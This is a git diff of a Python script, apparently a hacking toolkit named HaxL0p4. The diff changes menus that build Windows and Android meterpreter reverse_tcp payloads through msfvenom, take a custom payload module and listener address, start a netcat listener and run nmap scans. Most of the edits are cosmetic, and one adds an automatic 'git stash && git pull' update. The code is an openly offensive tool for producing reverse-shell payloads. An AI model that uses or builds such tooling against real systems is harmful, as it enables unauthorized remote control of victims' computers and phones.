@@ -2,7 +2,7 @@
 
 import os
 import nmap
-#import requests
+import requests
 import json
 from colorama import Fore, Style
 #import argparse
@@ -121,15 +121,11 @@ def createPayload(module, LHOST, LPORT, NAME, FORMAT):
         os.system(f"sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
     elif module == 2:
         os.system(f"sudo msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
-    elif module == 3:
-        typeModule = input("\nMODULE > ")
-        os.system(f"sufo msfvenom -p {typeModule} LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
+    else: ...
 
-def custom_module(LHOST, LPORT, FORMAT, NAME):
-    os.system("clear && figlet Custom Module")
-    module = input(f"{Fore.LIGHTBLUE_EX}MODULE{Style.RESET_ALL} > ")
-    if len(module) != 0:
-        createPayload(module=module, LHOST=LHOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
+def custom_module(MODULE, LHOST, LPORT, FORMAT, NAME):
+    os.system("clear && Hax-Remote")
+    os.system(f"sufo msfvenom -p {MODULE} LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
 
 def setPayload():
     os.system("clear && figlet HaxL0p4")
@@ -137,7 +133,7 @@ def setPayload():
     print(Modules_Payload)
     
     while True:
-        choice = input(f"\n{Fore.GREEN} HaxL0p4/CreatePayload {Style.RESET_ALL}{Fore.CYAN}> {Style.RESET_ALL}")
+        choice = input(f"\n{Fore.CYAN} HaxL0p4/CreatePayload {Style.RESET_ALL}> ")
 
         if choice not in ["1", "2", "3", "99"]:
             os.system("clear && figlet HaxL0p4")
@@ -177,7 +173,7 @@ def setPayload():
             except ValueError:
                 print(f"\n {Fore.RED} [!]Invalid format. Please enter an integer.{Style.RESET_ALL}")
 
-        FORMAT = input(f"\n FORMAT (e.g., exe): {Fore.CYAN}>{Style.RESET_ALL} ")
+        FORMAT = input(f"\n FORMAT (Ex: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
         NAME = input(f" \n NAME {Fore.CYAN}>{Style.RESET_ALL} ")
 
         if choice == "1":
@@ -185,7 +181,8 @@ def setPayload():
         elif choice == "2":
             createPayload(module=2, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
         elif choice == "3":
-            custom_module(LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
+            module = input(f"{Fore.LIGHTBLUE_EX}MODULE{Style.RESET_ALL} > ")
+            custom_module(MODULE=module, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
         elif choice == "99":
             break
         else:
@@ -235,6 +232,7 @@ def netcatListener():
         else:
             invalid_option = f"\n{Fore.RED} [💀] Invalid option... Please enter Y or N. {Style.RESET_ALL}"
             letter_animation(invalid_option, 0.03)
+            os.system("clear && figlet HaxL0p4-NC")
             return netcatListener()
         
     except KeyboardInterrupt:
@@ -373,7 +371,7 @@ def scanner():
         if s == "1":
             ip_scanner()
         elif s == "2":
-            letter_animation("\n"+prossimamente, 0.03)
+            letter_animation("\n"+" Coming Soon...", 0.03)
             scanner()
         elif s == "3":
             ip_lookup()
@@ -453,7 +451,7 @@ def RemoteAccess() :
 
     while True:
         print(Remote_options)
-        choice = input(f"\n{Fore.CYAN} HaxL0p4/RemoteAccess {Style.RESET_ALL}{Fore.CYAN}> {Style.RESET_ALL}")
+        choice = input(f"\n{Fore.CYAN} HaxL0p4/RemoteAccess {Style.RESET_ALL}> ")
 
         if choice == "1":
             setPayload()
@@ -472,7 +470,7 @@ def menu():
 
     while True:
         print(menu_options)
-        choice = input(f"\n{Fore.CYAN} HaxL0p4 {Style.RESET_ALL}{Fore.CYAN}> {Style.RESET_ALL}")
+        choice = input(f"\n{Fore.CYAN} HaxL0p4 {Style.RESET_ALL}> ")
 
         if choice == "1":
             RemoteAccess()
@@ -489,22 +487,21 @@ def menu():
         elif choice == "0":
             sys.exit()
         else:
-            os.system("clear && figlet Hax-Menu")
+            os.system("clear && figlet HaxL0p4")
             print(menu_options)
             invalid_option = f"{Fore.RED} [💀] Invalid option...{Style.RESET_ALL}"
             letter_animation(invalid_option, 0.03)
 
 def update():
     os.system("clear && figlet HaxL0p4")
-
-    update_msg = f"""
-    {Fore.LIGHTCYAN_EX}
-    [💡] Update v0.2.6 available!
-    [💡] Please download the new version.
-    [💡] Link: https://github.com/HeitorGonzaga/HaxL0p4/releases
-    {Style.RESET_ALL}
-    """
-    print(update_msg)
+    os.system("git stash && git pull")
+   # update_msg = f"""
+  #  {Fore.LIGHTCYAN_EX}
+  #  [💡] Please download the new version.
+  #  [💡] Link: https://github.com/L0PA/HaxL0p4
+  #  {Style.RESET_ALL}
+  #  """
+  #  print(update_msg)
     while True:
         back = input(f"\n{Fore.RED}Back? Y/N: {Style.RESET_ALL}")
 
@@ -517,7 +514,7 @@ def update():
 
 def main():
     os.system("clear && figlet HaxL0p4")
-    letter_animation(" [💡] Loading...", 0.03)
+    #letter_animation(" [💡] Loading...", 0.03)
     menu()
 
 if __name__ == "__main__":
